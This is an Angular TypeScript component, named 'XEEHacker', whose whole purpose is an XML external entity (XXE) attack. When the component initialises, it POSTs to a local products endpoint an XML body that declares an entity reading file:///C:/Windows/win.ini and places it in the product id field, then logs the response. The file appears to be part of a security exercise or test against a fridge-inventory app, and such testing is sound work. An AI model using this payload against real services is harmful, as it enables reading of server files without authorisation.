import { Component, OnInit } from '@angular/core';
// import { HttpBackend } from '@angular/common/http';
import { HttpClient, HttpHeaders } from '@angular/common/http';

@Component({
  selector: 'app-xeehacker',
  templateUrl: './xeehacker.component.html',
  styleUrls: ['./xeehacker.component.css']
})
export class XEEHackerComponent implements OnInit {

  constructor(private http: HttpClient) { }

  ngOnInit() {
    this.sendxml();
  }

  public sendxml() {
    const httpOptions = {
      headers: new HttpHeaders({
        contentType: 'text/xml', //<- To SEND XML
        accept: 'text/xml',       //<- To ask for XML
        responseType: 'text'             //<- b/c Angular understands text
      })
    };

    let body =
      "<?xml version = \"1.0\" encoding =\"UTF-8\"?>"
      + "<!DOCTYPE root ["
      + " <!ELEMENT root ANY >"
      + " <!ENTITY own SYSTEM \"file:///C:/Windows/win.ini\" >"
      + "]>"
      + "<root>"
      + "<product>"
      + "<id>&own;</id>"
      + "<fridge_id>1</fridge_id>"
      + "<start_weight>1</start_weight>"
      + "<current_weight>1</current_weight>"
      + "<expire_date>2</expire_date>"
      + "</product>"
      + "</root>";

    return this.http.post<string>('http://localhost:4200/products/' + '1', body, httpOptions)
      .subscribe(
        result => {
          console.log(result);  //<- XML response is in here *as plain text*
        },
        error => console.log('There was an error: ', error));
  }

}
